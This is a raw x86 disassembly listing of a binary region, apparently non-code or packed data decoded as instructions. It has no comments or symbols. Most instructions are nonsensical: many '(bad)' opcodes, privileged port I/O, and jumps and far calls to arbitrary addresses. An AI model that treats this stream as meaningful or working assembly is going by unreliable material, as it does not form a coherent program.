  40fcd8:	sub    ah,al
  40fcda:	jecxz  0x40fd24
  40fcdc:	cmp    eax,0xce5f290e
  40fce1:	outs   dx,DWORD PTR ds:[esi]
  40fce2:	sub    eax,0x5756175b
  40fce7:	sbb    edx,DWORD PTR [edx-0x47]
  40fcea:	mov    ebp,0x16f26b62
  40fcef:	sahf   
  40fcf0:	popa   
  40fcf1:	and    DWORD PTR [ebx-0x6694507c],edx
  40fcf7:	in     al,dx
  40fcf8:	(bad)  
  40fcf9:	loope  0x40fce4
  40fcfb:	fcom   QWORD PTR [edi-0x7]
  40fcfe:	xchg   ebp,eax
  40fcff:	jbe    0x40fd56
  40fd01:	adc    al,0xce
  40fd03:	mov    edi,0x50f270ce
  40fd08:	push   ss
  40fd09:	test   al,0x5e
  40fd0b:	push   eax
  40fd0c:	sti    
  40fd0d:	jle    0x40fd55
  40fd0f:	shl    BYTE PTR [eax],cl
  40fd11:	ret    0x80d5
  40fd14:	push   esi
  40fd15:	xor    ch,0xf4
  40fd18:	cdq    
  40fd19:	lock ins BYTE PTR es:[edi],dx
  40fd1b:	(bad)  
  40fd1c:	cli    
  40fd1d:	cli    
  40fd1e:	inc    ebp
  40fd1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd20:	or     BYTE PTR [eax+0xb27ea5],0xd3
  40fd27:	idiv   DWORD PTR [esi+0x182ab52f]
  40fd2d:	sbb    al,BYTE PTR [edi]
  40fd2f:	rol    DWORD PTR [ebp+ebx*2-0x493b314a],cl
  40fd36:	push   0x8806fe30
  40fd3b:	sub    DWORD PTR [ebx-0x6a],0xffffffa1
  40fd3f:	sub    dl,al
  40fd41:	xchg   esi,eax
  40fd42:	xchg   edi,eax
  40fd43:	sbb    bl,BYTE PTR [ebx-0x3bcdad30]
  40fd49:	mov    ds,esi
  40fd4b:	inc    ecx
  40fd4c:	shr    BYTE PTR [esi],0x35
  40fd4f:	jb     0x40fd9c
  40fd51:	jp     0x40fd23
  40fd53:	mov    eax,ds:0x1ef058be
  40fd58:	xchg   DWORD PTR [edx+0x10],edi
  40fd5b:	ja     0x40fdd8
  40fd5d:	dec    eax
  40fd5e:	cmp    ebp,DWORD PTR [ecx+0x1]
  40fd61:	jo     0x40fd15
  40fd63:	dec    edi
  40fd64:	sub    al,0x6f
  40fd66:	sub    ah,BYTE PTR [ebx-0x5b]
  40fd69:	js     0x40fdc4
  40fd6b:	icebp  
  40fd6c:	mov    ds,WORD PTR [eax+0x7f]
  40fd6f:	rcr    BYTE PTR [ebx],cl
  40fd71:	clc    
  40fd72:	add    ch,BYTE PTR [ebp+0x62]
  40fd75:	xor    eax,0xc7e950a4
  40fd7a:	and    BYTE PTR [ebx+eax*2-0x2e],ah
  40fd7e:	shr    dl,1
  40fd80:	aad    0x17
  40fd82:	dec    esi
  40fd83:	(bad)  [ebx+0x79]
  40fd86:	cdq    
  40fd87:	repz xor BYTE PTR [edx],dl
  40fd8a:	fcom   QWORD PTR [eax]
  40fd8c:	cmp    BYTE PTR [edx-0x3a7e4f12],bh
  40fd92:	stos   DWORD PTR es:[edi],eax
  40fd93:	pop    es
  40fd94:	stos   BYTE PTR es:[edi],al
  40fd95:	cwde   
  40fd96:	rol    DWORD PTR [ebx],0x86
  40fd99:	pop    ss
  40fd9a:	pop    esi
  40fd9b:	rol    DWORD PTR [ebp-0x19],0x5b
  40fd9f:	mov    gs,WORD PTR ds:0x1f3aac85
  40fda5:	push   es
  40fda6:	es push ecx
  40fda8:	ja     0x40fdb2
  40fdaa:	dec    edx
  40fdab:	sub    bh,BYTE PTR ss:[ecx+0x38]
  40fdaf:	fstp   DWORD PTR [ecx+0x48]
  40fdb2:	push   ds
  40fdb3:	jbe    0x40fe1b
  40fdb5:	push   esi
  40fdb6:	inc    edi
  40fdb7:	add    edi,edi
  40fdb9:	push   ss
  40fdba:	sahf   
  40fdbb:	(bad)  
  40fdbc:	mov    ch,0x3f
  40fdbe:	call   0x6cc:0xe7634772
  40fdc5:	or     ecx,DWORD PTR ds:0x8e40cb42
  40fdcb:	adc    BYTE PTR [eax],dl
  40fdcd:	pop    esp
  40fdce:	add    BYTE PTR [eax+eax*1-0x1e],dh
  40fdd2:	(bad)  
  40fdd3:	gs ret 0x614d
  40fdd7:	cmp    dh,BYTE PTR [edx]
  40fdd9:	and    DWORD PTR [esp+ebx*2],esi
  40fddc:	and    ebx,DWORD PTR [esi]
  40fdde:	jne    0x40fda9
  40fde0:	jno    0x40fe0a
  40fde2:	or     DWORD PTR [edi-0x1b],ecx
  40fde5:	cmp    bl,BYTE PTR [edx+0x6919c216]
  40fdeb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fdec:	xchg   DWORD PTR [edi+eax*4+0x4d],edx
  40fdf0:	xchg   ecx,eax
  40fdf1:	cmp    DWORD PTR [esi+0x6ee7c5b3],ecx
  40fdf7:	push   0x27
  40fdf9:	in     al,0xf6
  40fdfb:	sub    eax,0x4f3b2b37
  40fe00:	hlt    
  40fe01:	mov    esp,0xdde1f0d1
  40fe06:	imul   edx,DWORD PTR [edx],0x3338fec4
  40fe0c:	imul   ecx,DWORD PTR [ecx+0x6e],0xd9d5ea5b
  40fe13:	fisttp DWORD PTR [ebp+0x2d230744]
  40fe19:	mov    al,ds:0x1194d75d
  40fe1e:	adc    al,0xdf
  40fe20:	xor    BYTE PTR [edi+0x7458ed24],0xcc
  40fe27:	sub    eax,0xbdd6f61a
  40fe2c:	push   ebp
  40fe2d:	pop    ebx
  40fe2e:	repnz push edi
  40fe30:	push   ss
  40fe31:	xchg   BYTE PTR [edx],cl
  40fe33:	loopne 0x40fdda
  40fe35:	push   esi
  40fe36:	jle    0x40fdef
  40fe38:	test   BYTE PTR [ebx-0x4ff2ce41],dh
  40fe3e:	add    ebx,DWORD PTR [ecx+0x6e]
  40fe41:	pop    ds
  40fe42:	and    BYTE PTR [ebp-0x1f],ah
  40fe45:	pop    es
  40fe46:	or     DWORD PTR [edx],ecx
  40fe48:	jne    0x40fec2
  40fe4a:	out    0x32,al
  40fe4c:	(bad)  
  40fe4e:	scas   al,BYTE PTR es:[edi]
  40fe4f:	and    eax,0x38fc5b1f
  40fe54:	xor    eax,0xebff338
  40fe59:	xor    ah,BYTE PTR [eax-0x22]
  40fe5c:	rcr    edx,1
  40fe5e:	push   edx
  40fe5f:	dec    eax
  40fe60:	inc    ebp
  40fe61:	and    BYTE PTR [esi+ecx*1-0x7aad54a],0xe2
  40fe69:	std    
  40fe6a:	lock cld 
  40fe6c:	rcr    DWORD PTR [esi],1
  40fe6e:	jb     0x40fdf9
  40fe70:	(bad)
  40fe73:	mov    eax,DWORD PTR [ecx]
  40fe75:	inc    edx
  40fe76:	cmp    eax,0x9e0fda64
  40fe7b:	jo     0x40fe4b
  40fe7d:	js     0x40fe9d
  40fe7f:	dec    esi
  40fe80:	cwde   
  40fe81:	fmulp  st(7),st
  40fe83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe84:	push   cs
  40fe85:	mov    esi,0x77360335
  40fe8a:	lods   al,BYTE PTR ds:[esi]
  40fe8b:	jp     0x40fead
  40fe8d:	mov    ds:0xcbf912a3,eax
  40fe92:	pop    es
  40fe93:	sub    cl,BYTE PTR [esi]
  40fe95:	xchg   DWORD PTR [esi+eiz*8],eax
  40fe98:	es xchg edi,eax
  40fe9a:	jno    0x40fee7
  40fe9c:	call   0x358b8794
  40fea1:	jg     0x40fe3a
  40fea3:	sub    DWORD PTR [edx+ebp*8],ebp
  40fea6:	jmp    0xa980:0x311d4a2b
  40fead:	mov    WORD PTR [ebx-0x625d915e],?
  40feb3:	bound  edi,QWORD PTR [edx-0x3f3ecf4a]
  40feb9:	retf   
  40feba:	daa    
  40febb:	dec    edi
  40febc:	cmp    eax,0x7336eec2
  40fec1:	mov    eax,ds:0xeae0100a
  40fec6:	mov    ebp,0x3570fb58
  40fecb:	push   ss
  40fecc:	ret    0x9562
  40fecf:	imul   edx,esi,0x46a6c62
  40fed5:	xor    DWORD PTR [ecx],ebp
  40fed7:	fsub   DWORD PTR [eax+0x2a5ca491]
  40fedd:	push   ebp
  40fede:	adc    BYTE PTR [ebp+eiz*8+0x1edb7539],cl
  40fee5:	jns    0x40fe72
  40fee7:	pop    ebx
  40fee8:	daa    
  40fee9:	dec    edx
  40feea:	lods   al,BYTE PTR ds:[esi]
  40feeb:	cdq    
  40feec:	ret    0x2845
  40feef:	rcl    dl,cl
  40fef1:	shl    BYTE PTR [eax+0x46],1
  40fef4:	das    
  40fef5:	in     eax,dx
  40fef6:	ins    DWORD PTR es:[edi],dx
  40fef7:	call   0x8b4d13fa
  40fefc:	xchg   ebp,eax
  40fefd:	jo     0x40feb0
  40feff:	push   eax
  40ff00:	push   es
  40ff01:	pusha  
  40ff02:	pop    ebp
  40ff03:	add    eax,0xc52875b6
  40ff08:	fs jg  0x40fecc
  40ff0b:	sbb    DWORD PTR [edx],ebp
  40ff0d:	push   ebx
  40ff0e:	iret   
  40ff0f:	add    ah,BYTE PTR [ecx]
  40ff11:	dec    edx
  40ff12:	pop    edx
  40ff13:	pop    esp
  40ff14:	mov    ah,0xe4
  40ff16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff17:	idiv   BYTE PTR [ebp+0x1d]
  40ff1a:	sub    bl,BYTE PTR [ebx+ebx*8+0x15e6777]
  40ff21:	cmp    BYTE PTR [edi+eiz*8+0x1b21bf95],ch
  40ff28:	xchg   edi,eax
  40ff29:	mov    ch,BYTE PTR [edx-0x3c7165ab]
  40ff2f:	repz sub eax,0x7fbf1c9b
  40ff35:	sub    BYTE PTR [edx],cl
  40ff37:	dec    edi
  40ff38:	in     eax,0x94
  40ff3a:	xor    BYTE PTR [edx],0x41
  40ff3d:	mov    ebx,0x87060c12
  40ff42:	iret   
  40ff43:	dec    ebp
  40ff44:	xor    edx,DWORD PTR [edx-0xf]
  40ff47:	pop    esi
  40ff48:	mov    edi,0x22d77f45
  40ff4d:	shr    DWORD PTR [ebp+0x2],1
  40ff50:	out    dx,eax
  40ff51:	inc    edi
  40ff52:	sub    ebp,DWORD PTR [eax+esi*8]
  40ff55:	in     eax,dx
  40ff56:	sti    
  40ff57:	std    
  40ff58:	or     ch,BYTE PTR [ebx-0x136cf444]
  40ff5e:	push   edx
  40ff5f:	addr16 dec edi
  40ff61:	call   0x2a08:0x1d0b3e69
  40ff68:	sub    BYTE PTR [edx],0xf0
  40ff6b:	cli    
  40ff6c:	adc    cl,BYTE PTR [esi-0x3d]
  40ff6f:	inc    ebp
  40ff70:	sar    ch,1
  40ff72:	and    esi,DWORD PTR [esi+0x25]
  40ff75:	sub    al,0xb6
  40ff77:	or     ch,BYTE PTR [eax-0x6d]
  40ff7a:	test   al,0xb5
  40ff7c:	sbb    BYTE PTR ss:[ecx-0x20],0xc6
  40ff81:	shr    edi,1
  40ff83:	mov    dl,0x19
  40ff85:	mov    ds:0x9a9cb746,eax
  40ff8a:	push   ss
  40ff8b:	adc    ebx,ecx
  40ff8d:	dec    ebp
  40ff8e:	leave  
  40ff8f:	sbb    esp,DWORD PTR [eax]
  40ff91:	mov    ch,0x2c
  40ff93:	inc    ebp
  40ff94:	jl     0x40ff8e
  40ff96:	dec    ebx
  40ff97:	scas   al,BYTE PTR es:[edi]
  40ff98:	and    al,0x99
  40ff9a:	push   cs
  40ff9b:	fistp  QWORD PTR [ecx+0xf0e9bf7]
  40ffa1:	xchg   edi,eax
  40ffa2:	dec    edi
  40ffa3:	in     al,0x84
  40ffa5:	and    ebp,edx
  40ffa7:	imul   eax,DWORD PTR [edi],0x50
  40ffaa:	shl    DWORD PTR [esi+0x21],1
  40ffad:	arpl   WORD PTR [edi-0x5a4cb099],si
  40ffb3:	dec    edx
  40ffb4:	dec    edi
  40ffb5:	test   BYTE PTR [edi],0xda
  40ffb8:	jp     0x40ff6e
  40ffba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ffbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ffbc:	mov    ebx,0xb7847feb
  40ffc1:	cmp    ecx,edx
  40ffc3:	xchg   BYTE PTR [edi-0x12c6d151],al
  40ffc9:	push   esp
  40ffca:	fisttp WORD PTR [ecx+0x3445cc25]
  40ffd0:	adc    edi,ebx
  40ffd2:	xor    DWORD PTR ds:0xfd8a7e6d,ebx
  40ffd8:	mov    cs,edx
  40ffda:	add    DWORD PTR [eax-0x559c9840],ebx
  40ffe0:	push   ss
  40ffe1:	mov    edx,0xe75ddb1f
  40ffe6:	loopne 0x40ff94
  40ffe8:	sbb    eax,0x3ef5faa5
  40ffed:	xchg   ebx,eax
  40ffee:	pusha  
  40ffef:	lods   al,BYTE PTR ds:[si]
  40fff1:	ins    BYTE PTR es:[edi],dx
  40fff2:	ins    BYTE PTR es:[edi],dx
  40fff3:	push   esi
  40fff4:	popf   
  40fff5:	mov    fs,WORD PTR [edx+edi*2-0x38]
  40fff9:	sbb    ah,BYTE PTR [ebp-0x406ab7]
  40ffff:	sub    eax,0xbc535a16
  410004:	js     0x40ffb4
  410006:	adc    ebx,DWORD PTR [edi+0x2a5ac69]
  41000c:	push   esp
  41000d:	xchg   edi,eax
  41000e:	push   eax
  41000f:	jmp    0x3a6dac5d
  410014:	adc    edx,DWORD PTR [edx]
  410016:	int    0xaa
  410018:	loopne 0x41008c
  41001a:	lock ins DWORD PTR es:[edi],dx
  41001c:	lods   al,BYTE PTR ds:[esi]
  41001d:	outs   dx,BYTE PTR ds:[esi]
  41001e:	retf   0x2e1c
  410021:	int    0x2f
  410023:	inc    esp
  410024:	sbb    bl,BYTE PTR [esi-0x72]
  410027:	pop    esp
  410028:	int3   
  410029:	cmp    dl,BYTE PTR [eax-0x23585785]
  41002f:	xlat   BYTE PTR ds:[ebx]
  410030:	or     al,0xb
  410032:	sahf   
  410033:	fnstsw WORD PTR [ebx+ecx*4+0x2d]
  410037:	pop    ebx
  410038:	jecxz  0x410095
  41003a:	mov    DWORD PTR [ebx-0x3d951ae8],edi
  410040:	stc    
  410041:	mov    ebx,0x16a544a1
  410046:	dec    ebp
  410047:	stos   BYTE PTR es:[edi],al
  410048:	dec    eax
  410049:	stos   DWORD PTR es:[edi],eax
  41004a:	(bad)  
  41004b:	fsub   QWORD PTR [edi+ebx*2]
  41004e:	fcom   DWORD PTR [edx+0x62]
  410051:	ins    DWORD PTR es:[edi],dx
  410052:	push   ebx
  410053:	jge    0x4100b5
  410055:	icebp  
  410056:	sub    DWORD PTR ds:0xe0909b40,edi
  41005c:	and    DWORD PTR [edx],0xffffffa0
  41005f:	cmp    ebx,DWORD PTR [esi+ebp*8]
  410062:	ja     0x410048
  410064:	mov    ebp,gs
  410066:	mov    WORD PTR [esi],fs
  410068:	adc    DWORD PTR [edx+0x7d],eax
  41006b:	dec    edx
  41006c:	pushf  
  41006d:	cmp    eax,esi
  41006f:	es inc ebx
  410071:	pop    eax
  410072:	ret    
  410073:	jmp    0xa6d2701b
  410078:	and    edx,DWORD PTR [esi]
  41007a:	int    0x19
  41007c:	(bad)  
  41007d:	hlt    
  41007e:	mov    esi,0xb7a73e7e
  410083:	jecxz  0x410066
  410085:	add    DWORD PTR [esp+edx*8+0x70],edx
  410089:	sahf   
  41008a:	retf   
  41008b:	xor    dh,BYTE PTR [edi+0x1508ab6a]
  410091:	mov    ecx,0x644c1ab9
  410096:	inc    edi
  410097:	dec    ecx
  410098:	cmc    
  410099:	and    BYTE PTR [edi+0x800070],cl
  41009f:	pop    eax
  4100a0:	push   eax
  4100a1:	xchg   ecx,eax
  4100a2:	shr    BYTE PTR [edi-0x6d633d5e],cl
  4100a8:	or     eax,0x75dbf29e
  4100ad:	lods   eax,DWORD PTR ds:[esi]
  4100ae:	or     DWORD PTR [ecx+0x51],ecx
  4100b1:	lahf   
  4100b2:	iret   
  4100b3:	fiadd  WORD PTR [edx-0x4b54820e]
  4100b9:	into   
  4100ba:	idiv   BYTE PTR [esi-0x51]
  4100bd:	adc    eax,0x3d7c49e3
  4100c2:	fadd   st(6),st
  4100c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4100c5:	or     DWORD PTR [esi+0x23bf5bd],esi
  4100cb:	mov    ch,0xef
  4100cd:	xchg   esp,eax
  4100ce:	and    edi,edx
  4100d0:	aad    0x3a
  4100d2:	and    al,0xb3
  4100d4:	cli    
  4100d5:	scas   eax,DWORD PTR es:[edi]
  4100d6:	(bad)  
  4100d8:	jle    0x4100e5
  4100da:	js     0x410094
  4100dc:	cwde   
  4100dd:	into   
  4100de:	daa    
  4100df:	jecxz  0x41014f
  4100e1:	jne    0x4100c4
  4100e3:	lods   eax,DWORD PTR ds:[esi]
  4100e4:	mov    bh,0x76
  4100e6:	add    bh,ah
  4100e8:	aas    
  4100e9:	dec    esp
  4100ea:	sub    al,0x7d
  4100ec:	inc    edi
  4100ed:	icebp  
  4100ee:	test   eax,0x9cf8993d
  4100f3:	popa   
  4100f4:	xor    esp,DWORD PTR [eax]
  4100f6:	cmc    
  4100f7:	inc    ebp
  4100f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100f9:	mov    eax,0x3c3dbaaf
  4100fe:	adc    ecx,DWORD PTR [edx-0x32a2ab8e]
  410104:	add    al,0xfe
  410106:	loop   0x4100f2
  410108:	and    edi,DWORD PTR [edx+0x5d07b260]
  41010e:	cmp    BYTE PTR [ebx+ebx*1+0xe5df5cd],cl
  410115:	out    0x79,al
  410117:	cmp    DWORD PTR [ecx+0x36],ebp
  41011a:	std    
  41011b:	scas   eax,DWORD PTR es:[edi]
  41011c:	(bad)  
  41011d:	pop    es
  41011e:	test   DWORD PTR [eax+0x2b9a33f9],ecx
  410124:	cmp    al,0x66
  410126:	out    0xf2,al
  410128:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410129:	mov    edx,0x8980c7a3
  41012e:	(bad)  
  41012f:	fdivr  DWORD PTR [edi+eax*4]
  410132:	xchg   bh,cl
  410134:	jae    0x410172
  410136:	fist   DWORD PTR [ecx+0xc5904e4]
  41013c:	dec    ebx
  41013d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41013e:	cmp    BYTE PTR [edx],ah
  410140:	outs   dx,BYTE PTR ds:[esi]
  410141:	retf   0xd520
  410144:	sub    eax,0xb193ed98
  410149:	or     al,0xf3
  41014b:	rol    ebp,1
  41014d:	fadd   st(2),st
  41014f:	push   edi
  410150:	cdq    
  410151:	sbb    DWORD PTR cs:[esp+edx*8-0x3f],esp
  410156:	aad    0x35
  410158:	ds scas al,BYTE PTR es:[edi]
  41015a:	cs jb  0x410198
  41015d:	jg     0x410178
  41015f:	test   BYTE PTR [esi],0xb3
  410162:	sub    edi,eax
  410164:	jmp    0x4100ec
  410166:	sbb    al,0xe4
  410168:	mov    ds:0xefa312d0,eax
  41016d:	outs   dx,BYTE PTR ds:[esi]
  41016e:	jg     0x41012a
  410170:	nop
  410171:	pop    esp
  410172:	push   ecx
  410173:	jmp    0x9119:0x3546a10d
  41017a:	outs   dx,BYTE PTR ds:[esi]
  41017b:	push   0x921ad6e5
  410180:	(bad)  
  410181:	fnstsw WORD PTR [ebx]
  410183:	or     bl,BYTE PTR [ecx]
  410185:	and    eax,0x3c0f0646
  41018a:	cmp    al,0xba
  41018c:	push   cs
  41018d:	push   ds
  41018e:	or     eax,0x6f7c0a9
  410193:	dec    ecx
  410194:	mov    ebp,DWORD PTR [esi-0x5400f093]
  41019a:	aas    
  41019b:	pop    ds
  41019c:	cmp    dh,cl
  41019e:	es pop esp
  4101a0:	dec    edi
  4101a1:	push   edx
  4101a2:	repnz sub eax,DWORD PTR [esi-0x13]
  4101a6:	jno    0x410155
  4101a8:	push   cs
  4101a9:	pop    ss
  4101aa:	imul   eax,DWORD PTR [ecx],0x7f
  4101ad:	jmp    0x30b8:0x50af837d
  4101b4:	push   esp
  4101b5:	mov    esp,0xcef80a97
  4101ba:	jbe    0x410237
  4101bc:	push   edi
  4101bd:	mov    edx,0x87358346
  4101c2:	adc    ecx,DWORD PTR [ebx+0xa]
  4101c5:	push   esi
  4101c6:	sbb    edi,DWORD PTR [edx+edi*1+0x494dbce5]
  4101cd:	jg     0x410235
  4101cf:	addr16 (bad) 
  4101d1:	loopne 0x410198
  4101d3:	je     0x4101aa
  4101d5:	mov    WORD PTR [ecx-0x3934a242],?
  4101db:	std    
  4101dc:	ret    0x5f0c
  4101df:	enter  0x9ca6,0xfe
  4101e3:	gs push esi
  4101e5:	dec    edx
  4101e6:	jle    0x41017f
  4101e8:	mov    fs,WORD PTR [ecx]
  4101ea:	sti    
  4101eb:	pop    ebx
  4101ec:	push   ebp
  4101ed:	mov    ebp,0xa483c408
  4101f2:	ret    
  4101f3:	cli    
  4101f4:	or     cl,BYTE PTR [esi+ebx*2+0x106d89c]
  4101fb:	retf   
  4101fc:	mov    al,0x94
  4101fe:	ret    
  4101ff:	in     al,0xd9
  410201:	adc    dl,cl
  410203:	push   eax
  410204:	(bad)  
  410206:	dec    esp
  410207:	xlat   BYTE PTR ds:[ebx]
  410208:	cmp    BYTE PTR [edi],al
  41020a:	lods   al,BYTE PTR ds:[esi]
  41020b:	jo     0x41023f
  41020d:	push   0x2bfe6bf2
  410212:	in     eax,dx
  410213:	shl    edi,0x73
  410216:	call   0x7d2f:0xc26c8f8d
  41021d:	rcr    esi,1
  41021f:	lsl    ebx,WORD PTR ds:0xa93e5b65
  410226:	in     eax,dx
  410227:	std    
  410228:	inc    ebp
  410229:	push   ss
  41022a:	add    esi,edi
  41022c:	add    eax,0x8b166197
  410231:	xchg   BYTE PTR [esi],bl
  410233:	xchg   DWORD PTR [eax+ebx*1],ebx
  410236:	jne    0x410202
  410238:	dec    ecx
  410239:	test   al,0xce
  41023b:	and    al,BYTE PTR [edi+0x10]
  41023e:	inc    edx
  41023f:	push   ss
  410240:	test   bh,dh
  410242:	lea    ecx,[eax+0x2]
  410245:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410246:	cmp    al,0x2
  410248:	or     DWORD PTR [ebx+0x34a0ef8b],esp
  41024e:	pop    eax
  41024f:	lea    eax,[ebx+0x2397d0c5]
  410255:	(bad)  
  410256:	dec    esp
  410257:	push   0xffffffbe
  410259:	test   eax,0xd13600f8
  41025e:	bswap  edx
  410260:	jle    0x4101f1
  410262:	adc    eax,0x8eb00aa1
  410267:	cmp    esp,edx
  410269:	mov    edi,0xe9a41d89
  41026e:	scas   eax,DWORD PTR es:[edi]
  41026f:	test   al,0x7c
  410271:	leave  
  410272:	xchg   ebp,eax
  410273:	jge    0x4102db
  410275:	dec    ebp
  410276:	xor    eax,0x6ebfce85
  41027b:	ins    DWORD PTR es:[edi],dx
  41027c:	mov    bh,0xdf
  41027e:	add    eax,0xa666c3c5
  410283:	test   eax,0x2a686a9
  410288:	sub    dh,BYTE PTR [ebp-0x62615b2f]
  41028e:	push   eax
  41028f:	test   al,0x16
  410291:	shl    eax,cl
  410293:	aam    0x43
  410295:	xor    ch,al
  410297:	rcl    DWORD PTR [eax-0x773fedcd],1
  41029d:	mov    ebp,0xfdd12912
  4102a2:	retf   
  4102a3:	out    dx,al
  4102a4:	sub    eax,0xebd6ce6a
  4102a9:	out    dx,al
  4102aa:	cs cdq 
  4102ac:	mov    ecx,0xcb6f78e2
  4102b1:	gs xchg esp,eax
  4102b3:	neg    ah
  4102b5:	ret    
  4102b6:	arpl   WORD PTR [ebp-0x6f],bx
  4102b9:	hlt    
  4102ba:	lds    ebp,FWORD PTR [eax+esi*2-0x56]
  4102be:	mov    ebp,0x601b5b25
  4102c3:	dec    edx
  4102c4:	imul   esp,DWORD PTR [esi+edi*2+0x382acfa7],0x40
  4102cc:	jmp    0x410349
  4102ce:	dec    ebx
  4102cf:	adc    esp,edx
  4102d1:	dec    eax
  4102d2:	lods   al,BYTE PTR ds:[esi]
  4102d3:	pushf  
  4102d4:	sar    bh,cl
  4102d6:	lods   eax,DWORD PTR ds:[esi]
  4102d7:	xchg   ecx,eax
  4102d8:	into   
  4102d9:	loopne 0x410265
  4102db:	stos   DWORD PTR es:[edi],eax
  4102dc:	cdq    
  4102dd:	and    BYTE PTR [eax+0x5936f1d6],al
  4102e3:	in     eax,0x99
  4102e5:	jg     0x4102bb
  4102e7:	jp     0x410354
  4102e9:	mov    edi,0x95438481
  4102ee:	xor    ch,BYTE PTR [eax-0x7a]
  4102f1:	xchg   esi,eax
  4102f2:	pop    eax
  4102f3:	je     0x41030a
  4102f5:	fldcw  WORD PTR [ebp+0x33]
  4102f8:	cmp    esp,eax
  4102fa:	pop    edi
  4102fb:	sti    
  4102fc:	sbb    al,0x5
  4102fe:	jb     0x41029c
  410300:	frstor [ecx]
  410302:	js     0x41028a
  410304:	cmp    ah,BYTE PTR [esi]
  410306:	retf   
  410307:	add    BYTE PTR [ebp+0x79d25431],bl
  41030d:	leave  
  41030e:	mov    cl,0x45
  410310:	add    edx,DWORD PTR ds:0xf9d9efd4
  410316:	and    bh,dh
  410318:	push   ds
  410319:	ja     0x410322
  41031b:	pusha  
  41031c:	retf   0x4478
  41031f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410320:	mov    dl,0x4f
  410322:	xor    bh,BYTE PTR [edi]
  410324:	sbb    eax,0x78b75ac5
  410329:	faddp  st(1),st
  41032b:	jne    0x4102dc
  41032d:	sub    DWORD PTR [esi-0x70],0x966025e3
  410334:	inc    edx
  410335:	mov    edi,0x9e90581d
  41033a:	fnstcw WORD PTR [edx-0x3413f98]
  410340:	adc    BYTE PTR [ecx-0x6c],0xf4
  410344:	sub    esi,ebx
  410346:	loop   0x41034c
  410348:	daa    
  410349:	mov    ds:0x907a73a8,eax
  41034e:	imul   ebp,eax,0x62ad8c52
  410354:	loope  0x4102f3
  410356:	add    DWORD PTR [eax+0x49f513a4],edx
  41035c:	jae    0x41033a
  41035e:	sti    
  41035f:	sub    eax,0xdda5fa66
  410364:	or     DWORD PTR [edx+0x34690ff1],esp
  41036a:	rcl    DWORD PTR [ecx+0x47],cl
  41036d:	and    BYTE PTR [bx+di+0x4b51],dh
  410372:	add    BYTE PTR [ecx+0x2e276525],al
  410378:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410379:	mov    ah,0xb
  41037b:	rcr    BYTE PTR ds:0xf8069bf2,1
  410381:	fdiv   DWORD PTR [edx-0x2e]
  410384:	add    bh,dl
  410386:	ins    BYTE PTR es:[edi],dx
  410387:	inc    esi
  410388:	call   FWORD PTR [ebx-0x5e]
  41038b:	mov    bh,0xba
  41038d:	test   eax,0x6bebfda7
  410392:	cmp    al,0x91
  410394:	inc    edx
  410395:	jbe    0x410389
  410397:	mov    edi,esi
  410399:	inc    ebx
  41039a:	jl     0x410375
  41039c:	mov    BYTE PTR [edi-0x904480b],dl
  4103a2:	dec    ecx
  4103a3:	adc    BYTE PTR [ebp-0xac90bf7],0xd9
  4103aa:	imul   edx,DWORD PTR [ecx+0x3f],0x8dcd48ef
  4103b1:	pop    ss
  4103b2:	pop    ebx
  4103b3:	mov    bl,0x38
  4103b5:	mov    bl,0x2e
  4103b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4103b8:	pop    es
  4103b9:	and    dh,ah
  4103bb:	fadd   DWORD PTR [ecx]
  4103bd:	cdq    
  4103be:	mov    ds:0x67c1818c,al
  4103c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4103c4:	sbb    DWORD PTR [ecx+ebx*2-0x64],eax
  4103c8:	add    al,0x3d
  4103ca:	loopne 0x410417
  4103cc:	or     DWORD PTR [edx-0x45],0x60e423b7
  4103d3:	adc    dh,BYTE PTR [eax]
  4103d5:	xor    edx,DWORD PTR [eax]
  4103d7:	mov    ah,0xb6
  4103d9:	ins    BYTE PTR es:[edi],dx
  4103da:	hlt    
  4103db:	push   0x2d
  4103dd:	push   ecx
  4103de:	pop    ebp
  4103df:	loope  0x410444
  4103e1:	(bad)  
  4103e2:	or     dl,bh
  4103e4:	xchg   ebp,eax
  4103e5:	pop    eax
  4103e6:	dec    edi
  4103e7:	lock sbb BYTE PTR [esi-0x43cf9353],ah
  4103ee:	mov    dh,0xef
  4103f0:	and    esp,DWORD PTR [esi]
  4103f2:	cld    
  4103f3:	int3   
  4103f4:	in     eax,dx
  4103f5:	xchg   BYTE PTR [edi-0x2a],bl
  4103f8:	imul   ecx,esi,0xffffff8d
  4103fb:	popa   
  4103fc:	push   ecx
  4103fd:	inc    edx
  4103fe:	repnz sbb al,0xa8
  410401:	sub    DWORD PTR [ebp+0x5b],ecx
  410404:	test   eax,eax
  410406:	aaa    
  410407:	into   
  410408:	nop
  410409:	ja     0x410462
  41040b:	and    al,0xde
  41040d:	inc    eax
  41040e:	jns    0x410479
  410410:	arpl   WORD PTR [esp+ebp*1-0x46],ax
  410414:	or     al,0xf6
  410416:	xor    al,0xd1
  410418:	jmp    0x4103f0
  41041a:	jno    0x41043d
  41041c:	jg     0x410409
  41041e:	outs   dx,BYTE PTR ds:[esi]
  41041f:	imul   BYTE PTR [eax+0x2225db2c]
  410425:	adc    esi,esp
  410427:	sub    ch,BYTE PTR [edi]
  410429:	fwait
  41042a:	xor    DWORD PTR [ebx-0x5dd7021a],esi
  410430:	(bad)  
  410431:	jge    0x41047e
  410433:	xor    BYTE PTR [eax-0x1b0d07e0],bl
  410439:	out    dx,al
  41043a:	sub    al,0xfe
  41043c:	jo     0x410431
  41043e:	ficom  WORD PTR [edx-0x4c]
  410441:	fsubr  st(3),st
  410443:	jle    0x41041f
  410445:	mov    edi,0xec6726cf
  41044a:	ret    
  41044b:	dec    ebp
  41044c:	inc    ebx
